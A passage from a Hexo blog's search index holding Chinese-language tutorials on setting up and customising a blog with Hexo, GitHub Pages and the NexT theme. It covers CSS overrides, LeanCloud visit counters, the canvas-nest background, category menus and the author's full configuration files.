文章相应底部样式修改最大的红框部分的内容都不是我编辑的文章里的，都是我更改了源代码加入的DIV样式标签形成的效果，当然还可以在每一篇文章最后加入对应的代码也可以，但是为了麻烦每次来粘贴所以我就没去这样做 思路修改文章模板文件哪个是文章主要内容的模板文件，对应的路径themes\next\layout\_macro\post.swig文章底部的代码位置如下： 123456789101112131415161718192021 &#123;&#123; content.substring(0, theme.auto_excerpt.length) &#125;&#125; &#123;% if content.length &gt; theme.auto_excerpt.length %&#125;...&#123;% endif %&#125; &lt;div class=&quot;post-more-link text-center&quot;&gt; &lt;a class=&quot;btn&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&#123;% if theme.scroll_to_more %&#125;#more&#123;% endif %&#125;&quot; rel=&quot;contents&quot;&gt; &#123;&#123; __(&apos;post.read_more&apos;) &#125;&#125; &amp;raquo; &lt;/a&gt; &lt;/div&gt; &#123;% else %&#125; &#123;% if post.type === &apos;picture&apos; %&#125; &lt;a href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;&gt;&#123;&#123; post.content &#125;&#125;&lt;/a&gt; &#123;% else %&#125; &#123;&#123; post.content &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% else %&#125; &#123;&#123; post.content &#125;&#125; ### 编辑区域 &#123;% endif %&#125; 那个打赏功能是主题自带的一个参数配置，大家可以去next主题官方文档上看。 文章底部的横线样式修改小红框里面的一条线，有些人觉得想换样式，换颜色或直接去掉。直接在.post-nav下加入一个样式 123.post-nav &#123; border: none;&#125; 文章阅读次数的统计深入讲解对比分析方法 再次用下这张图，我这里面的阅读次数是通过leanCloud,来实现文章阅读量统计的，next主题还自带了一个不蒜子的统计参数配置，相信大家用过了，在主题的配置文件里有如下代码： 1234567891011121314151617# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 访问用户： site_uv_footer: 人 # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; 访问次数： site_pv_footer: 次 # custom pv span for one page only page_pv: false page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt;&amp;nbsp点击量 page_pv_footer: 次 我设置page_pv为false因为我打算用leanCloud来实现,因为用不蒜子这个来统计是没问题，但是它说了 # custom pv span for one page only意思是只显示在文章相应这里，你在首页是看不到阅读次数统计的，对用户体验来说十分不好，所以打算用leanCloud，如果觉得首页不展示阅读次数什么的无所谓的，就可以用next主题的不蒜子插件，具体的查看官方文档上面有写方法。 这里讲下官方文档上没有详细说明的leanCloud,来实现文章阅读量统计的方法 leanCloud来实现阅读统计我现在版本的next主题是集成了这个插件的，并且给出了对应的参数配置 123456# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: true app_id: TxBSdzFliqxOpec29xEd8pO5-gzGzoHsz app_key: 5rH911Nhs9V7AWFjEYqe8Bz7 过程是：1.注册leancloud账户并完成验证后登录leanCloud的，创建应用并配置相关操作2.获取对应的AppID和AppKey3.配置相应参数完成阅读文章的数量的统计 注册账户过程省略…没啥好说的 创建一个应用 进入应用创建Class我之前已经创建好了一个Class名为Counter,创建成功就会出来了。 获取AppID和AppKey 设置主题配置文件 设置主题配置文件_config.yml相关字段，实现阅读数量的统计添加以下字段 1234leancloud_visitors: enable: true app_id: #你的App ID app_key: #你的的App Key 完成配置并重新编译。 通过在本地服务器测试是看不到阅读次数的统计的，所以要发布到网上查看才行。 酷炫的博客背景添加背景特效 背景的几何线条是采用的nest效果，一个基于html5canvas绘制的网页背景效果，非常赞！来自github的开源项目canvas-nest 特性 123不依赖任何框架或者内库，比如不依赖jQuery，使用原生的javascript。非常小，只有1.66kb，如果开启gzip，可以更小。非常容易实现，配置简单，即使你不是web开发者，也能简单搞定。 使用非常简单 color: 线条颜色, 默认: ‘0,0,0’ ；三个数字分别为(R,G,B)，注意用,分割 opacity: 线条透明度（0~1）, 默认: 0.5 count: 线条的总数量, 默认: 150 zIndex: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1 添加修改代码next/layout/_layout.swig，在body标签之前添加如下代码： 123&#123;% if theme.canvas_nest %&#125;&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;&gt;&lt;/script&gt;&#123;% endif %&#125; 打开next/_config.yml，添加以下代码： 12# Canvas-nestcanvas_nest: true 如果是最新的next主题是集成了这段代码的，如果没手动添加，有就设置为true 完成重新编译配置后，在本地测试就能看到效果了。 在首页菜单里添加的独立的标签页标题的意思大概是文章列表实现效果如图： 实现过程思想 1、修改HEXO POST模板，添加categories。以后的文章将会以此作为模板新增。 2、新增一文章，并修改分类属性。分类属性如果被设置，在HEXO编译会生成对应分类目录3、修改主题配置文件(config.yml),添加MENU分类字段 ,导航栏显示分类链接 4、假定为中文网站，修改主题目录下的语言配置文件(zh-Hans.yml) .导航栏链接显示中文 修改HEXO POST模板添加categories在你的HEXO根目录下，找到文件夹scaffolds，此文件夹下定义创建文章的基本模型，你可以修改此模板实现每次进行HEXO NEW 文章名，文章会以您的模板进行对应配置属性创建。这里我们主要是新增categories字段，让每次新增文章都会打上此属性字段。scaffolds里有三个文件分别对应草稿、页面、文章，建议都加上如下代码：123456---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories:--- 新增一文章，并修改分类属性新建文章后如： hexo new 你的文章名，并打开您的文章，在categories写上你的分类名字，此操作后并保存文档，在你进行hexo g编译的时候会在你的PUBLIC目录下的 categories下建立以你分类名字命名的文件夹，以后的链接将定向到此文件夹。(本文的测试分类名为：life 中文名生活) 修改主题配置文件添加MENU分类字段修改代码大概如下，参考下就行了。12345678910menu: home: / categories: /categories about: /about archives: /archives tags: /tags #commonweal: /404.html #sitemap: /sitemap.xml life: /categories/life technology: /categories/technology 修改主题目录下的语言配置文件路径为themes\next\languages 文件为zh-Hans.yml修改代码如下123456789101112menu: home: 首页 archives: 归档 categories: 分类 tags: 标签 about: 关于 search: 搜索 schedule: 日程表 sitemap: 站点地图 commonweal: 公益404 life: 生活 technology: 技术 完成重新编译预览下效果。 总结这篇写了不少小技巧，都是平时总结的，当然还有一些没讲到的点，如果有疑问的可以在下面评论说，我会在后面的文章提及。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2017年最新基于hexo搭建个人免费博客——自定义页面样式一]]></title>
      <url>%2Fhexo-settings-3%2F</url>
      <content type="text"><![CDATA[前言之前答应一个评论朋友要写出这篇自定义CSS样式来修改hexo下的next主题，本来打算要写很多相关hexo下主题的一些修改方法和博客优化了，由于晚上跟朋友看了电影，导致时间不允许我写那么多，所以这篇只是来介绍一下如何自己修改一些样式并生成到博客上。 调试工具浏览器下的开发者工具相信做前端的都知道每个浏览器自带了一个调试者工具一般都是按F12就能出来，基本上每个浏览器的这个调试工具都类似，所以我以360浏览器下的调试工具来演示（其实360的调试工具和谷歌是一样的，我只是觉得360用起来更流畅点） 接着说正题因为考虑到一部分人是没接触过前端的，所以我会讲的比较细，有前端调试开发经验的可以看快点，找到你们需要关注的地方和问题解决方法。大家打开调试者工具会看到红色圈里的东西，里面显示的这个网站的源代码结构，我们要修改任何东西也是要现在这方面进行样式修改看下效果，最后才去next里的一些文件进行部分的添加和修改来达到我们的目的。 头部导航样式自定义定位到对应标签位置通过右键点击审查元素或者手动用放大镜选择，通过观察可以发现整个头部是包裹在一个header里而且大家把鼠标放上去也可以很清楚的看到标签包裹的是哪些部分，那么通过开发工具可以看到右边对应的是生成在这个标签上class里的一些样式设置. 找到修改地方通过观察右侧css样式，有前端经验的人可以自己去diy一下，设置成自己想要的值，改变布局样式之类的，我就不用多说，改好后请记得把代码copy下来。 注意：通过观察可以发现右侧的CSS样式都来源于一个main.css里。 添加你修改的代码找到你主题文件夹里的对应位置以我的路径为例子D:\hexo\blog\themes\next\source\css里面有5个文件夹和一个styl文件，main.styl主要用于打包CSS代码输出成CSS样式的main.css文件,分析下其源代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445// CSS Style Guide: http://codeguide.co/#css$scheme = hexo-config(&apos;scheme&apos;) ? hexo-config(&apos;scheme&apos;) : &apos;Muse&apos;;$variables = base $scheme custom;$mixins = base $scheme custom;// Variables Layer// --------------------------------------------------for $variable in $variables @import &quot;_variables/&quot; + $variable// Mixins Layer// --------------------------------------------------for $mixin in $mixins @import &quot;_mixins/&quot; + $mixin;// Common Layer// --------------------------------------------------// Scaffolding@import &quot;_common/scaffolding&quot;;// Layout@import &quot;_common/outline&quot;;// Components@import &quot;_common/components&quot;;// Schemes Layer// --------------------------------------------------@import &quot;_schemes/&quot; + $scheme;// Custom Layer ##这个是关键大家注意// --------------------------------------------------@import &quot;_custom/custom&quot;; 大家可以看到我在代码说最后一段代码很关键，因为这是加载导出自定义设置的代码，可以覆盖到上面已经导出的CSS样式，也就是你可以覆盖掉以前生成的样式，而不用去在源文件下修改代码，如果你想换回去，你只需要将_custom/custom.styl这个里面的代码删除即可。 注意：本人不提倡去修改除了_custom下的其他4个文件里的源代码，可能后面出问题不好还原。 修改侧面栏同理这个的修改和头部那个差不多，你也只需要定位到对应的位置进行样式修改，比如修改背景图，颜色之类的。 注意地方在修改css的时候尽量写注释一定要记得，分模块来写，不要头部写了又写其他的部分的CSS，到时候不好维护 福利 我的CSS我将会给大家开源我自己的CSS样式修改给大家来做参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165// Custom styles.//首页文章阴影样式.post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 14px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 14px rgba(202, 203, 204, .5);&#125;//热评文章.ds-top-threads li a &#123; padding-left: 5px; transition: border-width 0.2s linear 0s, color 0.2s linear 0s; border-bottom: none;&#125;.ds-top-threads li a:hover &#123; border-left: 8px solid #4d768c;&#125;//首页头部样式.header &#123; background: url(&quot;/images/header-bk.jpg&quot;);&#125;.site-meta &#123; float: none;&#125;.menu &#123; float: none;&#125;.logo-line-before,.logo-line-after &#123; display: none;&#125;.menu .menu-item a &#123; font-size: 14px; color: rgb(15, 46, 65); border-radius: 4px;&#125;.site-meta &#123; margin-left: 0px; text-align: center;&#125;.site-meta .site-title &#123; font-size: 28px; font-family: &apos;Comic Sans MS&apos;, sans-serif; color: #fff;&#125;//首页尾部样式.footer &#123; background: none; font-size: 16px;&#125;.footer-inner &#123; font-family: &apos;Comic Sans MS&apos;, sans-serif; text-align: center; color: #4c618f;&#125;//侧边栏信息样式修改.site-author-name &#123; margin: 48px 0 0; color: #090909; font-family: &apos;Comic Sans MS&apos;, sans-serif;&#125;.links-of-blogroll &#123; font-size: 14px; margin-bottom: 42px;&#125;.links-of-author &#123; margin-top: 30px; margin-bottom: 58px;&#125;.sidebar-inner &#123; color: #649ab6;&#125;.sidebar &#123; box-shadow: inset 2px 2px 40px #bdb2b2;&#125;.sidebar a &#123; color: #649ab6; border-bottom-color: #649ab6; border-bottom: none;&#125;.sidebar a:hover &#123; color: #0c0b0b;&#125;.site-state-item &#123; display: inline-block; padding: 8px 28px; border-left: 1px solid #649ab6;&#125;.sidebar-nav .sidebar-nav-active &#123; color: #649ab6; border-bottom-color: #649ab6;&#125;.sidebar-nav li:hover &#123; color: #0c0b0b;&#125;//侧栏按钮样式.sidebar-toggle &#123; background: #649ab6;&#125;.back-to-top &#123; background: #649ab6;&#125;//文章目录样式.post-toc .nav .active&gt;a &#123; color: #4f7e96;&#125;.post-toc ol a:hover &#123; color: #7784ba;&#125;.sidebar-nav .sidebar-nav-active:hover &#123; color: #37596c;&#125;a &#123; border-bottom: none;&#125;//首页阅读全文样式.post-button &#123; margin-top: 30px; text-align: center;&#125;.post-button .btn &#123; color: #fff; font-size: 15px; background: #686868; border-radius: 16px; line-height: 2; margin: 0 4px 8px 4px; padding: 0 20px;&#125;.post-button a&#123; border-bottom: 1px solid #666;&#125;.post-button a:hover &#123; color: #7784ba;&#125; 尾部修改建议尾部没什么好修改的，就是自定义下CSS让它好看点就行了，我用到了一个不蒜子的插件，next主题已经集成了，我在此基础上修改了一点而已，使用起来很简单。 尾部署名LOGO我的是一滴水，就是简单替换了fontawsome里的一个图标而已。 其他部分修改提醒基本上会自定义CSS修改已经能让你修改出你自己想要的风格了，但是主题的框架布局是不能改变的，你只能改变微小的样式而已。 其他小修改背景是用到一个JS来生成的，大家如果感兴趣可以在下面评论，我可以给一个地址给大家参考使用。 网易云播放器也是第三方生成的添加到了生成页面框架的源代码里实现的，还有一些文章图标的DIY之类的和美化。 还有首页的导航如何添加新的一个菜单按钮进去，我后面会说。 我大概会再出一篇文章来给大家讲解以上说的点，让大家都能实现我现在的效果。 总结 今天写的比较匆忙，有些地方我有机会会重新再修改下。有任何问题和建议，可以在下面评论。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2017年最新基于hexo搭建个人免费博客——从零开始]]></title>
      <url>%2Fhexo-settings-1%2F</url>
      <content type="text"><![CDATA[前言搭建此博客是因为通过github上了解到github pages进而知道了可以把静态网页博客托管给github仓库或许您已经通Git + Hexo 搭建个人博客网站了解到如何通过HEXO + GIT 实现个人博客网站的建立。但是尽管您已经成功建立博客网站，但是你需要对网站做合适的配置和调整才能迎合你的网站要求。本文主要介绍HEXO的基本操作命令和网站的基本配置方法。 github pages介绍Github Pages 是 github 公司提供的免费的静态网站托管服务，用起来方便而且功能强大，不仅没有空间限制(为免费用户提供了500M空间)，还可以绑定自己的域名。到 https://pages.github.com/ 上，看到可以创建的网站有两类，一类是为自己或者是自己的组织创建站点，就是新建一个仓库，仓库的名字叫做，username.github.io 或者是 orgnizationname.github.io ，注意这里的 username 和 orgnizationname 要严格替换成你自己的用户名或者组织名，大小写也要区分，不然就会有问题。然后就往仓库里面放页面内容就行了。第二类是为项目创建网站，这个其实主要步骤都是一样的，只不过稍微比创建用户或组织网站复杂一点点。具体的可以看这个网址的讲解Github Pages 域名注册和绑定我是在万网注册的域名和设置DNS解析，所以我只会讲在阿里云下的域名绑定。进入到控制台后点击自己刚买的域名进入域名管理界面，然后进行添加解析操作，按照途中所给的值填写，注意将记录值改为自己的github pages地址最后一步必须在所建立的github仓库的主分支里建立一个CNAME文件内容为你要解析到的目地地址注意这个CNAME文件要放到source文件里面我的路径为1D:\hexo\blog\source\ 放到这个下面的用意为你每次hexo d的时候会把你原先仓库的所有东西清除掉，所以你的CNAME文件也会没有，这样可以避免这种情况发生 hexo安装和配置Hexo博客搭建的基础大致流程为：安装Node.js →安装Git → 安装Hexo → 安装主题 → 本地测试运行 → 注册给github与coding并创建pages仓库 → 部署Node.js和git的安装大家自己去网上搜下，当以上都安好后可以通过git bash来输入命令查看是否安装成功以及对应的版本 随后执行下述命令来安装hexo1npm install -g hexo-cli hexo初始化安装完成后要先提前建好一个文件夹，所以我在自己D盘建立了一个hexo文件夹，里面随后剪了一个blog文件夹，用命令cd到blog这个目录1cd d:/hexo/blog 执行命令12hexo init # hexo会在目标文件夹建立网站所需要的所有文件npm install # 安装依赖包 本地启动 有了必要的各种配置文件之后就可以在本地预览效果了12hexo g # 等同于hexo generate，生成静态文件到public文件夹hexo s # 等同于hexo server，在本地服务器运行 还有个命令 1hexo clean #作用为清除静态文件夹的内容并删掉，主要用于更改变更了某些地方导致页面显示不完善 之后打开浏览器并输入IP地址 http://localhost:4000/ 查看，效果如下 新建页面和文章12hexo new &quot;title&quot; # 生成新文章：\source\_posts\title.mdhexo new page &quot;title&quot; # 生成新的页面，后面可在主题配置文件中配置页面 生成文章或页面的模板放在博客文件夹根目录下的 scaffolds/ 文件夹里面，文章对应的是 post.md ，页面对应的是page.md，草稿的是draft.md 编辑文章打开新建的文章\source_posts\postName.md，其中postName是hexo new “title”中的title 123456789---title: Start My Blog Trip — Power By Hexo # 文章页面上的显示名称，可以任意修改，不会出现在URL中date: 2017-2-10 23:49:28 # 文章生成时间，一般不改categories: diary # 文章分类目录，多个分类使用[a,b,c]这种格式tags: [Hexo,diary] # 文章标签---#这里开始使用markdown格式输入你的正文。&lt;!--more--&gt; #more标签以下的内容要点击“阅读全文”才能看见，#more标签以上的内容为你首页显示文章的摘要部分 MD文章编辑如果你对MD语法不熟悉，推荐你去马克飞象使用它的在线网页编辑，可以实现一边打字一边查看效果，很方便。地址：https://maxiang.io/ 常用命令总结1234567hexo init [folder] # 初始化一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站hexo new [layout] &lt;title&gt; # 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来hexo version # 查看版本hexo clean # 清除缓存文件 (db.json) 和已生成的静态文件 (public)hexo g # 等于hexo generate # 生成静态文件hexo s # 等于hexo server # 本地预览hexo d # 等于hexo deploy # 部署，可与hexo g合并为 hexo d -g 安装主题前言截止2017年，hexo和next都在更新，现今网上的版本和其对应的配置文件都已经发生了巨大的变化，所以我把官网最新的17年的版本配置文件的详情给大家来讲解，大家可以下最新的版本和看我的配置进行修改。 主题下载hexo主题有很多，这里我自己使用的next主题所以就以它来讲。我的版本为v5.1.0（目前最新）下载地址：https://github.com/iissnan/hexo-theme-next/releases把下来的文件夹解压和更名为next，并复制到theme目录下 HEXO网站的配置文件123在根目录下的_config.yml主要是对网站的总属性进行设置如：网站标题，网站logo,网站插件使用等全局的属性主题目录下的_config.yml主要是针对网站的布局，导航等特性设置进行设置 我的根目录配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: Water Sister&apos;s Blogsubtitle: 生活、技术个人博客description: 思考中.....author: Yang ZiHaolanguage: zh-Hanstimezone:# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: http://www.cduyzh.comroot: /permalink: :title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render: - baidu_verify_n9RJHacKra.html - google5caece7c800b9ce3.html# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: truerelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# ExtensionsPlugins: - hexo-generator-sitemap - hexo-generator-baidu-sitemap## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: github: git@github.com:cduyzh/cduyzh.github.io.git,master index_generator: per_page: 5archive_generator: per_page: 20 yearly: true monthly: truetag_generator: per_page: 10menu: about: /about #头像设置avatar: /images/yzh.jpg# 多说热评文章 true 或者 falseduoshuo_hotartical: true#sitemap# hexo sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml #local searchsearch: path: search.xml field: post format: html limit: 1000 我的主题目录配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /images/favicon.ico# Set default keywords (Use a comma to separate)keywords: &quot;cduyzh前端开发博客&quot;# Set rss to false to disable feed link.# Leave rss as empty to use site&apos;s feed link.# Set rss to specific value if you have burned your feed already.rss:# Specify the date when the site was setup#since: 2015# icon between year and author @Footerauthoricon: tint# Footer `powered-by` and `theme-info` copyrightcopyright: false# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: true# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)menu: home: / categories: /categories about: /about archives: /archives tags: /tags #commonweal: /404.html #sitemap: /sitemap.xml life: /categories/life technology: //categories/technology# Enable/Disable menu icons.# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of menu item and value is the name of FontAwesome icon. Key is case-senstive.# When an question mask icon presenting up means that the item has no mapping icon.menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heart life: coffee technology: cog# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemes#scheme: Musescheme: Mist#scheme: Pisces# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal italic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on &lt;body&gt; element. global: # external: true will load this font family from host. external: true family: Lato # Font settings for Headlines (h1, h2, h3, h4, h5, h6) # Fallback to `global` font settings. headings: external: true family: # Font settings for posts # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo # Fallback to `global` font settings. # The `size` option use `px` as unit logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links# Key is the link label showing to end users.# Value is the target link (E.g. GitHub: https://github.com/iissnan)social: #LinkLabel: Link GitHub: https://github.com/cduyzh 知乎: https://www.zhihu.com/people/yang-zi-hao-cheng-du-da-xue Weibo: http://weibo.com/3290722423/ QQ: http://wpa.qq.com/msgrd?v=3&amp;uin=450311265&amp;site=qq&amp;menu=yes# Social Links Icons# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of the item and value is the name of FontAwesome icon. Key is case-senstive.# When an globe mask icon presenting up means that the item has no mapping icon.social_icons: enable: true # Icon Mappings. # KeyMapsToSocialItemKey: NameOfTheIconFromFontAwesome GitHub: github #Twitter: twitter Weibo: weibo QQ: qq# Sidebar Avatar# in theme directory(source/images): /images/avatar.jpg# in site directory(source/uploads): /uploads/avatar.jpg#avatar:# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggle. #display: post display: always #display: hide #display: remove # Sidebar offset from top menubar in pixels. offset: 12 offset_float: 0 # Back to top in sidebar b2t: false # Scroll percent label in b2t button scrollpercent: false# Blog rollslinks_title: Links#links_layout: block#links_layout: inlinelinks: hexo: https://hexo.io/zh-cn/ next: http://theme-next.iissnan.com/ web project: http://www.watersister.top# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommend.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: true length: 400# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: true wordcount: true min2read: true#Wechat Subscriber#wechat_subscriber:# enabled: true# qcode: /images/wechatpay.jpg# description: subscribe to my blog by scanning my public wechat account# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images&apos;s urlcustom_logo: enabled: false image: # Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: night# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML# Swiftype Search API Key#swiftype_key:# Baidu Analytics ID#baidu_analytics:# Duoshuo ShortNameduoshuo_shortname: cduyzh# Disqus#disqus_shortname:# Hypercomments#hypercomments_id:# Gentie productKey#gentie_productKey:# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Support for LiveRe comments system.# You can get your uid from https://livere.com/insight/myCode (General web site)#livere_uid: your uid# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share#jiathis:# Warning: JiaThis does not support https.#add_this_id:# Shareduoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# Yandex Webmaster tools verification setting# See: https://webmaster.yandex.ru/#yandex_site_verification:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: true admin_enable: false user_id: 6224774254659896065 admin_nickname: author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# VKontakte API Support.# To get your AppID visit https://vk.com/editapp?act=createvkontakte_api: enable: false app_id: #&lt;app_id&gt; like: true comments: true num_of_posts: 10# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: true app_id: TxBSdzFliqxOpec29xEd8pO5-gzGzoHsz app_key: 5rH911Nhs9V7AWFjEYqe8Bz7# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 访问用户： site_uv_footer: 人 # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; 访问次数： site_pv_footer: 次 # custom pv span for one page only page_pv: false page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt;&amp;nbsp点击量 page_pv_footer: 次# Tencent analytics ID# tencent_analytics:# Tencent MTA ID# tencent_mta:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: true# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: &quot;We didn&apos;t find any results for the search: $&#123;query&#125;&quot; hits_stats: &quot;$&#123;hits&#125; results found in $&#123;time&#125; ms&quot;# Local searchlocal_search: enable: true# External URL with BASE64 encrypt &amp; decrypt# Usage: &#123;% exturl text url &quot;title&quot; %&#125;# Alias: &#123;% extlink text url &quot;title&quot; %&#125;exturl: false#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionuse_motion: true# Fancyboxfancybox: true# Canvas-nestcanvas_nest: true# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: 